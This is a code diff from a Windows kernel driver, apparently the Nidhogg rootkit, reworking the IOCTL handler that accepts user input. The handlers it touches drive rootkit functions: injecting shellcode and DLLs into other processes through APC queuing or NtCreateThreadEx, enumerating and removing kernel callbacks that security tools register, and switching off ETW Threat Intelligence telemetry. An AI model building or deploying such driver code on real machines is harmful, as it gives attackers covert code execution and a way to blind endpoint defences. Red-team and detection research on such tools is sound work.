+		ShellcodeInformation shellcodeInfo{};
 		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;
 
-		if (size % sizeof(ShellcodeInformation) != 0) {
+		if (!VALID_SIZE(size, sizeof(ShellcodeInformation))) {
 			status = STATUS_INVALID_BUFFER_SIZE;
 			break;
 		}
 
 		auto data = (ShellcodeInformation*)Irp->AssociatedIrp.SystemBuffer;
+		shellcodeInfo.Pid = data->Pid;
 
-		if (!VALID_PROCESS(data->Pid) || !data->Shellcode || data->ShellcodeSize <= 0) {
+		if (!VALID_PROCESS(shellcodeInfo.Pid)) {
 			status = STATUS_INVALID_PARAMETER;
 			break;
 		}
 
-		switch (data->Type) {
+		shellcodeInfo.Type = data->Type;
+		shellcodeInfo.ShellcodeSize = data->ShellcodeSize;
+		shellcodeInfo.Parameter1 = NULL;
+		shellcodeInfo.Parameter1Size = data->Parameter1Size;
+		shellcodeInfo.Parameter2 = NULL;
+		shellcodeInfo.Parameter2Size = data->Parameter2Size;
+		shellcodeInfo.Parameter3 = NULL;
+		shellcodeInfo.Parameter3Size = data->Parameter3Size;
+		MemoryAllocator<PVOID> shellcodeAllocator(shellcodeInfo.Shellcode, shellcodeInfo.ShellcodeSize, PagedPool);
+		status = shellcodeAllocator.CopyData(data->Shellcode, shellcodeInfo.ShellcodeSize);
+
+		if (!NT_SUCCESS(status))
+			break;
+
+		// Copy parameters
+		if (shellcodeInfo.Parameter1Size > 0) {
+			MemoryAllocator<PVOID> parameter1Alloc(shellcodeInfo.Parameter1, shellcodeInfo.Parameter1Size, PagedPool);
+			status = parameter1Alloc.CopyData(data->Parameter1, shellcodeInfo.Parameter1Size);
+		}
+
+		if (!NT_SUCCESS(status))
+			break;
+
+		if (shellcodeInfo.Parameter2Size > 0) {
+			MemoryAllocator<PVOID> parameter2Alloc(shellcodeInfo.Parameter2, shellcodeInfo.Parameter2Size, PagedPool);
+			status = parameter2Alloc.CopyData(data->Parameter2, shellcodeInfo.Parameter2Size);
+		}
+
+		if (!NT_SUCCESS(status))
+			break;
+
+		if (shellcodeInfo.Parameter3Size > 0) {
+			MemoryAllocator<PVOID> parameter3Alloc(shellcodeInfo.Parameter3, shellcodeInfo.Parameter3Size, PagedPool);
+			status = parameter3Alloc.CopyData(data->Parameter3, shellcodeInfo.Parameter3Size);
+		}
+
+		if (!NT_SUCCESS(status))
+			break;
+
+		switch (shellcodeInfo.Type) {
 			case APCInjection: {
 				if (!Features.ApcInjection) {
 					KdPrint((DRIVER_PREFIX "Due to previous error, APC shellcode injection feature is unavaliable.\n"));
@@ -783,7 +933,7 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 					break;
 				}
 
-				status = NidhoggMemoryUtils->InjectShellcodeAPC(data);
+				status = NidhoggMemoryUtils->InjectShellcodeAPC(&shellcodeInfo);
 				break;
 			}
 			case NtCreateThreadExInjection: {
@@ -793,7 +943,7 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 					break;
 				}
 
-				status = NidhoggMemoryUtils->InjectShellcodeThread(data);
+				status = NidhoggMemoryUtils->InjectShellcodeThread(&shellcodeInfo);
 				break;
 			}
 			default:
@@ -812,21 +962,36 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 
 	case IOCTL_INJECT_DLL:
 	{
+		DllInformation dllInfo{};
 		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;
 
-		if (size % sizeof(DllInformation) != 0) {
+		if (!VALID_SIZE(size, sizeof(DllInformation))) {
 			status = STATUS_INVALID_BUFFER_SIZE;
 			break;
 		}
 
 		auto data = (DllInformation*)Irp->AssociatedIrp.SystemBuffer;
+		dllInfo.Pid = data->Pid;
+		dllInfo.Type = data->Type;
+		SIZE_T dllPathSize = strlen(data->DllPath);
 
-		if (!VALID_PROCESS(data->Pid) || !data->DllPath) {
+		if (dllPathSize > MAX_PATH) {
+			status = STATUS_INVALID_BUFFER_SIZE;
+			break;
+		}
+		errno_t err = strncpy_s(dllInfo.DllPath, data->DllPath, dllPathSize);
+
+		if (err != 0) {
+			status = STATUS_INVALID_BUFFER_SIZE;
+			break;
+		}
+
+		if (!VALID_PROCESS(dllInfo.Pid)) {
 			status = STATUS_INVALID_PARAMETER;
 			break;
 		}
 
-		switch (data->Type) {
+		switch (dllInfo.Type) {
 			case APCInjection: {
 				if (!Features.ApcInjection) {
 					KdPrint((DRIVER_PREFIX "Due to previous error, APC dll injection feature is unavaliable.\n"));
@@ -834,7 +999,7 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 					break;
 				}
 
-				status = NidhoggMemoryUtils->InjectDllAPC(data);
+				status = NidhoggMemoryUtils->InjectDllAPC(&dllInfo);
 				break;
 			}
 			case NtCreateThreadExInjection: {
@@ -844,7 +1009,7 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 					break;
 				}
 
-				status = NidhoggMemoryUtils->InjectDllThread(data);
+				status = NidhoggMemoryUtils->InjectDllThread(&dllInfo);
 				break;
 			}
 			default:
@@ -865,7 +1030,7 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 	{
 		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;
 
-		if (size % sizeof(ObCallbacksList) != 0) {
+		if (!VALID_SIZE(size, sizeof(ObCallbacksList))) {
 			status = STATUS_INVALID_BUFFER_SIZE;
 			break;
 		}
@@ -895,7 +1060,7 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 	{
 		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;
 
-		if (size % sizeof(PsRoutinesList) != 0) {
+		if (!VALID_SIZE(size, sizeof(PsRoutinesList))) {
 			status = STATUS_INVALID_BUFFER_SIZE;
 			break;
 		}
@@ -922,7 +1087,7 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 	{
 		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;
 
-		if (size % sizeof(CmCallbacksList) != 0) {
+		if (!VALID_SIZE(size, sizeof(CmCallbacksList))) {
 			status = STATUS_INVALID_BUFFER_SIZE;
 			break;
 		}
@@ -938,7 +1103,7 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 	{
 		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;
 
-		if (size % sizeof(KernelCallback) != 0) {
+		if (!VALID_SIZE(size, sizeof(KernelCallback))) {
 			status = STATUS_INVALID_BUFFER_SIZE;
 			break;
 		}
@@ -1001,6 +1166,8 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 
 	case IOCTL_ENABLE_DISABLE_ETWTI:
 	{
+		bool enable = false;
+
 		if (!Features.EtwTiTamper) {
 			KdPrint((DRIVER_PREFIX "Due to previous error, etwti tampering is unavaliable.\n"));
 			status = STATUS_UNSUCCESSFUL;
@@ -1009,13 +1176,18 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 
 		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;
 
-		if (size % sizeof(bool) != 0) {
+		if (!VALID_SIZE(size, sizeof(bool))) {
 			status = STATUS_INVALID_BUFFER_SIZE;
 			break;
 		}
 
 		auto data = (bool*)Irp->AssociatedIrp.SystemBuffer;
-		status = NidhoggAntiAnalysis->EnableDisableEtwTI(*data);
+		MemoryAllocator<bool*> enableAllocator(&enable, sizeof(bool), PagedPool);
+		status = enableAllocator.CopyData(data, sizeof(bool));
+
+		if (!NT_SUCCESS(status))
+			break;
+		status = NidhoggAntiAnalysis->EnableDisableEtwTI(enable);
 
 		if (!NT_SUCCESS(status))
 			KdPrint((DRIVER_PREFIX "Failed to tamper ETWTI (0x%08X)\n", status));
